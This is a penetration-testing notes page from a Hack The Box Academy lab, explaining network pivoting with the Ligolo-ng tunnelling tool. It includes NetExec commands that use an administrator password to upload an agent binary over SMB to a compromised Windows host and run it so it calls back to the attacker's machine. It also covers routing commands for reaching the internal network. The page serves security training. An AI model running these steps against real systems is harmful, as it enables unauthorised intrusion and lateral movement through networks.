---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Ligolo-ng

## Commands

### Basic Commands

{% tabs %}
{% tab title="1. Server tun if" %}
```bash
sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
```
{% endtab %}

{% tab title="2a. Proxy (no internet)" %}
```bash
proxy -selfcert
```
{% endtab %}

{% tab title="2b. Proxy (internet)" %}
```bash
proxy -autocert
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="3. Agent" %}
```bash
./agent -connect 10.129.204.146:11601
```
{% endtab %}

{% tab title="4. Add route" %}
```
sudo ip route add 172.16.10.0/24 dev ligolo
```
{% endtab %}

{% tab title="5. Session" %}
```bash
ligolo-ng » session
```
{% endtab %}

{% tab title="6. Tunnel" %}
```bash
[Agent : user@nworkstation] » start_tunnel --tun ligolo
```
{% endtab %}
{% endtabs %}

### Agent Transfer & Execution

{% tabs %}
{% tab title="Transfer" %}
{% code overflow="wrap" %}
```bash
$ nxc smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' --local-auth --put-file 'agent.exe' '\Windows\Temp\agent.exe'
```
{% endcode %}
{% endtab %}

{% tab title="Execute" %}
{% code overflow="wrap" %}
```bash
$ nxc smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' --local-auth -x '\Windows\Temp\agent.exe -connect 10.10.15.223:11601 -ignore-cert'
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Usage

{% hint style="info" %}
The below network configuration is from the [Vulnerability Scan Modules](https://academy.hackthebox.com/module/84/section/822) section of the Hack The Box's [Using CrackMapExec](https://academy.hackthebox.com/module/details/84) module.
{% endhint %}

We have compromised a Windows pivot host with 2 NICs (Figure 1). Our goal is to be able to interact with the `172.16.10.0/24` network, which at the moment we cannot (Figure 2).&#x20;

<figure><img src="../../../.gitbook/assets/ligolo_ipconfig.png" alt=""><figcaption><p>Figure 1: The compromised pivot host has 2 NICs, one for the 172.16.10.0 and one for the 10.129.0.0 network.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ligolo_target_network_fail.png" alt=""><figcaption><p>Figure 2: Performing an unsuccessful live host discovery and ARP port scan on the target network. </p></figcaption></figure>

Create a tun interface on the Linux attack host (Figure 3).

<figure><img src="../../../.gitbook/assets/ligolo_tun_if.png" alt=""><figcaption><p>Figure 3: Setting up a tun intefrace.</p></figcaption></figure>

Start `proxy` on the Linux attack host (Figure 4). For pivot hosts with no internet connectivity a self-signed certificate needs to be generated (`-selfcert`). Otherwise, use `-autocert` to request a proper certificate.

> _On a Windows attack host, we need to have the appropriate_ [_`wintun.dll`_](https://www.wintun.net/) _on the same folder._

<figure><img src="../../../.gitbook/assets/ligogo_proxy.png" alt=""><figcaption><p>Figure 4: Starting the proxy server on the attack host.</p></figcaption></figure>

Transfer and execute the `agent.exe` binary to the pivot host (Figure 5).

{% hint style="success" %}
**Admin access** on the target host **is** **NOT required**!
{% endhint %}

<figure><img src="../../../.gitbook/assets/ligolo_ng_agent_transfer_execute.png" alt=""><figcaption><p>Figure 5: Transferring and executing the agent on the pivot host.</p></figcaption></figure>

A connection should be received on the attack host (Figure 6).

<figure><img src="../../../.gitbook/assets/ligolo_proxy_received.png" alt=""><figcaption><p>Figure 6: Received a connection on thte attack host.</p></figcaption></figure>

Add an IP route for the target network (_ligogo device_) on the attack host (Figure 7).

<figure><img src="../../../.gitbook/assets/liogo_add_route.png" alt=""><figcaption><p>Figure 7: Adding an IP route for the target network.</p></figcaption></figure>

Choose the appropriate session and start the tunnel (Figure 8).

<figure><img src="../../../.gitbook/assets/ligolo_start_tunnel.png" alt=""><figcaption><p>Figure 8: Choosing the session and starting the tunnel.</p></figcaption></figure>

We can now interact from our attack host as if we were a part of the internal network (Figure 9).

<figure><img src="../../../.gitbook/assets/ligolo_live_host_disc_arp_port_scan.png" alt=""><figcaption><p>Figure 9: Performing a successful live host discovery and an ARP port scan on the target network.</p></figcaption></figure>

## Resources

{% tabs %}
{% tab title="Repo" %}
{% embed url="https://github.com/nicocha30/ligolo-ng" %}
{% endtab %}

{% tab title="Video Demo" %}
{% embed url="https://www.youtube.com/watch?v=qou7shRlX_s" %}
{% endtab %}
{% endtabs %}
